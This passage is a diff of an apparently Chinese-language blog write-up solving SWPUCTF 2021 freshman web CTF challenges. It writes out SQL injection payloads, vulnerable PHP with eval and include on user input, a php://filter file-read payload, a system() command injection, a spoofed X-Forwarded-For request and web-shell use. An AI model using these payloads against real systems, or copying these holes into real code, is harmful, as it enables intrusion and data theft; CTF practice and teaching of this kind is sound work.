-<p><img src="/images/SWPUCTF-Web-sql-2.png" srcset="/img/loading.gif" lazyload alt="图四展示了开始猜字段"></p>
-<h4 id="确定回显点"><a href="#确定回显点" class="headerlink" title="确定回显点"></a>确定回显点</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; order by 1 --+</span></code></pre></div>
+<p><img src="/images/SWPUCTF-Web-sql-2.png" alt="图四展示了开始猜字段"></p>
+<h4 id="确定回显点"><a href="#确定回显点" class="headerlink" title="确定回显点"></a>确定回显点</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; order by 1 --+</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="判断出字段数为3"><a href="#判断出字段数为3" class="headerlink" title="判断出字段数为3"></a>判断出字段数为3</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; order by 3 --+</span></code></pre></div>
+<h4 id="判断出字段数为3"><a href="#判断出字段数为3" class="headerlink" title="判断出字段数为3"></a>判断出字段数为3</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; order by 3 --+</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="查看回显点"><a href="#查看回显点" class="headerlink" title="查看回显点"></a>查看回显点</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span></code></pre></div>
+<h4 id="查看回显点"><a href="#查看回显点" class="headerlink" title="查看回显点"></a>查看回显点</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="查看数据库信息"><a href="#查看数据库信息" class="headerlink" title="查看数据库信息"></a>查看数据库信息</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1, 2, @@version --+</span></code></pre></div>
+<h4 id="查看数据库信息"><a href="#查看数据库信息" class="headerlink" title="查看数据库信息"></a>查看数据库信息</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1, 2, @@version --+</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/SWPUCTF-Web-sql-3.png" srcset="/img/loading.gif" lazyload alt="图五展示了通过sql注入查看数据库信息"></p>
+<p><img src="/images/SWPUCTF-Web-sql-3.png" alt="图五展示了通过sql注入查看数据库信息"></p>
 <p>MariaDB数据库管理系统是MySQL的一个分支，说明需要使用mysql语句注入</p>
-<h4 id="查询库名和用户名"><a href="#查询库名和用户名" class="headerlink" title="查询库名和用户名"></a>查询库名和用户名</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1, 2, database() --+</span></code></pre></div>
+<h4 id="查询库名和用户名"><a href="#查询库名和用户名" class="headerlink" title="查询库名和用户名"></a>查询库名和用户名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1, 2, database() --+</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="可知，当前数据库名为test-db"><a href="#可知，当前数据库名为test-db" class="headerlink" title="可知，当前数据库名为test_db"></a>可知，当前数据库名为test_db</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1, 2, user() --+</span></code></pre></div>
+<h4 id="可知，当前数据库名为test-db"><a href="#可知，当前数据库名为test-db" class="headerlink" title="可知，当前数据库名为test_db"></a>可知，当前数据库名为test_db</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1, 2, user() --+</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="得知目前用户是root-可以查看任意数据库信息"><a href="#得知目前用户是root-可以查看任意数据库信息" class="headerlink" title="得知目前用户是root 可以查看任意数据库信息"></a>得知目前用户是<code>root</code> 可以查看任意数据库信息</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>test_db<span class="hljs-string">&#x27;--+</span></code></pre></div>
+<h4 id="得知目前用户是root-可以查看任意数据库信息"><a href="#得知目前用户是root-可以查看任意数据库信息" class="headerlink" title="得知目前用户是root 可以查看任意数据库信息"></a>得知目前用户是<code>root</code> 可以查看任意数据库信息</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>test_db<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
 
 <h4 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h4><p>发现有两个表，test_tb和users</p>
-<div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1, 2, group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>test_tb<span class="hljs-string">&#x27; --+</span></code></pre></div>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1, 2, group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>test_tb<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
 
 <p>发现有<code>flag</code>表</p>
-<h4 id="查看flag表内容"><a href="#查看flag表内容" class="headerlink" title="查看flag表内容"></a>查看<code>flag</code>表内容</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2, group_concat(flag) from test_tb --+</span></code></pre></div>
+<h4 id="查看flag表内容"><a href="#查看flag表内容" class="headerlink" title="查看flag表内容"></a>查看<code>flag</code>表内容</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2, group_concat(flag) from test_tb --+</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/SWPUCTF-Web-sql-4.png" srcset="/img/loading.gif" lazyload alt="成功拿到flag"></p>
-<h2 id="SWPUCTF-2021-新生赛-include"><a href="#SWPUCTF-2021-新生赛-include" class="headerlink" title="[SWPUCTF 2021 新生赛]include"></a>[SWPUCTF 2021 新生赛]include</h2><p><img src="/images/SWPUCTF-Web-include-1.png" srcset="/img/loading.gif" lazyload alt="题目详情"></p>
+<p><img src="/images/SWPUCTF-Web-sql-4.png" alt="成功拿到flag"></p>
+<h2 id="SWPUCTF-2021-新生赛-include"><a href="#SWPUCTF-2021-新生赛-include" class="headerlink" title="[SWPUCTF 2021 新生赛]include"></a>[SWPUCTF 2021 新生赛]include</h2><p><img src="/images/SWPUCTF-Web-include-1.png" alt="题目详情"></p>
 <p>用<code>Hackbar</code>传入一个<code>file</code>试试</p>
-<p><img src="/images/SWPUCTF-Web-include-2.png" srcset="/img/loading.gif" lazyload alt="图二展示了利用Hackbar传入一个名为file值为1的参数后页面回显"></p>
-<div class="code-wrapper"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
-<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;allow_url_include&quot;</span>,<span class="hljs-string">&quot;on&quot;</span>);
-<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);
-<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
-<span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))&#123;
-    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
-    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag 在flag.php中&#x27;</span>;
-&#125;<span class="hljs-keyword">else</span>&#123;
-    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;传入一个file试试&quot;</span>;
-&#125;
-<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;
-<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;
-<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;
-<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;
-<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;
-<span class="hljs-keyword">include_once</span>(<span class="hljs-variable">$file</span>);
-<span class="hljs-meta">?&gt;</span> flag 在flag.php中</code></pre></div>
+<p><img src="/images/SWPUCTF-Web-include-2.png" alt="图二展示了利用Hackbar传入一个名为file值为1的参数后页面回显"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_include&quot;</span>,<span class="string">&quot;on&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag 在flag.php中&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;传入一个file试试&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span> flag 在flag.php中</span><br></pre></td></tr></table></figure>
 
 <p>分析脚本发现其中开了远程包含，说明我们可以用文件包含(远程包含)去做这道题，我们通过PHP伪协议来远程包含并读取<code>flag.php</code>文件</p>
 <h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>php:&#x2F;&#x2F;filter可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取</p>
 <p>For example:</p>
-<div class="code-wrapper"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=index.php</span></code></pre></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
 
 <p>通俗来讲，convert.base64-encode是一种过滤器，read是用来指定读取的文章内容利用管道符，来进行条件的再筛选，后面要进行base64-encode以解码</p>
 <p>构造以下payload</p>
-<div class="code-wrapper"><pre><code class="hljs php">/?file=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span></code></pre></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/SWPUCTF-Web-include-3.png" srcset="/img/loading.gif" lazyload alt="图三展示了利用php伪协议以读取flag.php文件"></p>
-<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;NSSCTF&#123;e8c19d3d-d948-4e0b-8d6d-1fbf35fd3ba2&#125;&#x27;</span>;</code></pre></div>
+<p><img src="/images/SWPUCTF-Web-include-3.png" alt="图三展示了利用php伪协议以读取flag.php文件"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$flag</span>=<span class="string">&#x27;NSSCTF&#123;e8c19d3d-d948-4e0b-8d6d-1fbf35fd3ba2&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
-<h2 id="SWPUCTF-2021-新生赛-easyrce"><a href="#SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]easyrce"></a>[SWPUCTF 2021 新生赛]easyrce</h2><div class="code-wrapper"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
-<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
-<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))
-&#123;
-<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);
-&#125;
-<span class="hljs-meta">?&gt;</span></code></pre></div>
+<h2 id="SWPUCTF-2021-新生赛-easyrce"><a href="#SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]easyrce"></a>[SWPUCTF 2021 新生赛]easyrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/SWPUCTF-Web-easyrce-1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/SWPUCTF-Web-easyrce-1.png"></p>
 <p>替换成：</p>
-<div class="code-wrapper"><pre><code class="hljs clean">/?url=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cat /flllllaaaaaaggggggg&quot;</span>);</code></pre></div>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=<span class="keyword">system</span>(<span class="string">&quot;cat /flllllaaaaaaggggggg&quot;</span>);</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/SWPUCTF-Web-easyrce-2.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/SWPUCTF-Web-easyrce-2.png"></p>
 <h2 id="SWPUCTF-2021-新生赛-caidao"><a href="#SWPUCTF-2021-新生赛-caidao" class="headerlink" title="[SWPUCTF 2021 新生赛]caidao"></a>[SWPUCTF 2021 新生赛]caidao</h2><p>直接AntSword连接后在根目录下找到flag</p>
-<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">NSSCTF</span>&#123;<span class="hljs-number">68</span>bb6079-<span class="hljs-number">56</span>dc-<span class="hljs-number">4</span>f7a-ba1e-<span class="hljs-number">96</span>afcdca7b1a&#125;</code></pre></div>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">NSSCTF</span>&#123;<span class="number">68</span>bb6079-<span class="number">56</span>dc-<span class="number">4</span>f7a-ba1e-<span class="number">96</span>afcdca7b1a&#125;</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="SWPUCTF-2021-新生赛-Do-you-know-http"><a href="#SWPUCTF-2021-新生赛-Do-you-know-http" class="headerlink" title="[SWPUCTF 2021 新生赛]Do_you_know_http"></a>[SWPUCTF 2021 新生赛]Do_you_know_http</h2><p>抓包后将<code>User-Agent</code>改成<code>WLLM</code></p>
-<p><img src="/images/SWPUCTF-http-1.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/images/SWPUCTF-http-2.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/SWPUCTF-http-1.png"></p>
+<p><img src="/images/SWPUCTF-http-2.png"></p>
 <p>发现这里是有一个文件的，还给了提示”智能用本地ip访问”</p>
 <p>直接用XFF(X-Forwarded-For)</p>
-<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /./a.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
-<span class="hljs-attribute">Host</span>: node7.anna.nssctf.cn:<span class="hljs-number">28524</span>
-<span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span>
-<span class="hljs-attribute">Accept</span>-Language: en-US
-<span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span>
-<span class="hljs-attribute">User</span>-Agent: WLLM
-<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>
-<span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br
-<span class="hljs-attribute">Connection</span>: keep-alive
-<span class="hljs-attribute">X</span>-Forwarded-For:<span class="hljs-number">127.0.0.1</span>
-<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">2</span></code></pre></div>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /./a.php HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: node7.anna.nssctf.cn:<span class="number">28524</span></span><br><span class="line"><span class="attribute">Cache</span>-Control: max-age=<span class="number">0</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: en-US</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: WLLM</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0</span>.<span class="number">8</span>,application/signed-exchange;v=b3;q=<span class="number">0</span>.<span class="number">7</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">X</span>-Forwarded-For:<span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">Content</span>-Length: <span class="number">2</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/SWPUCTF-Web-http-3.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/SWPUCTF-Web-http-3.png"></p>
 <p>在MITM交互式劫持页面选择放行（我们上面构造的数据包）</p>
-<p><img src="/images/SWPUCTF-Web-http-3.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/SWPUCTF-Web-http-3.png"></p>
 <p>成功拿到flag</p>
-<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">NSSCTF</span>&#123;ee2756e8-a41c-<span class="hljs-number">4</span>d15-<span class="hljs-number">8</span>bd9-<span class="hljs-number">0</span>f50a445919d&#125;</code></pre></div>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">NSSCTF</span>&#123;ee2756e8-a41c-<span class="number">4</span>d15-<span class="number">8</span>bd9-<span class="number">0</span>f50a445919d&#125;</span><br></pre></td></tr></table></figure>
 
 
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
+    </div>
     
-      <span class="category-chain">
+    <!-- Post Footer -->
+    <footer class="post-footer">
         
-  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/Web/" class="print-no-link">#Web</a>
-      
-        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
-      
-    </div>
-  
-</div>
-
-
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>SWPUCTF2021新生赛Web刷题记录</div>
-      <div>https://zer0ptr.github.io/2025/07/21/SWPUCTF2021新生赛Web刷题记录/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>Author</div>
-          <div>zer0ptr</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>Posted on</div>
-          <div>July 21, 2025</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>Licensed under</div>
-          <div>
-            
-              
-              
-                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
-                    <i class="iconfont icon-cc-by"></i>
-                  </span>
-                </a>
-              
-            
-          </div>
-        </div>
-      
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
-
-
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2025/07/27/what-is-greedy-algorithm/" title="What Is Greedy Algorithm">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">What Is Greedy Algorithm</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2025/07/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCrypto-babyFibo/" title="攻防世界Crypto-babyFibo">
-                        <span class="hidden-mobile">攻防世界Crypto-babyFibo</span>
-                        <span class="visible-mobile">Next</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
+            <div class="post-updated">
+                <small>Last updated: July 29, 2025</small>
             </div>
-
+        
+        
+        <!-- Post Navigation -->
+        <nav class="post-nav">
             
-  
-  
-    <article id="comments" lazyload>
-      
+                <div class="post-nav-item post-nav-prev">
+                    <a href="/2025/07/27/what-is-greedy-algorithm/" class="post-nav-link">
+                        <span class="post-nav-label">← Previous</span>
+                        <span class="post-nav-title">What Is Greedy Algorithm</span>
+                    </a>
+                </div>
+            
+            
+            
+                <div class="post-nav-item post-nav-next">
+                    <a href="/2025/07/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCrypto-babyFibo/" class="post-nav-link">
+                        <span class="post-nav-label">Next →</span>
+                        <span class="post-nav-title">攻防世界Crypto-babyFibo</span>
+                    </a>
+                </div>
+            
+        </nav>
+    </footer>
+</article>
 
-    </article>
-  
+<!-- Comments Section -->
 
+        </main>
 
-          </article>
-        </div>
-      </div>
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="footer-content">
+                <p>&copy; 2025 zer0ptr. All rights reserved.</p>
+                
+            </div>
+        </footer>
     </div>
 
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header">
-    <i class="iconfont icon-list"></i>
-    <span>Table of Contents</span>
-  </p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-  
-  
-
-
-
-
-
-
-
-
-
+    <!-- 按需加载Highlight.js JavaScript -->
     
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-    </div>
-  
-  
-  
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
-
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
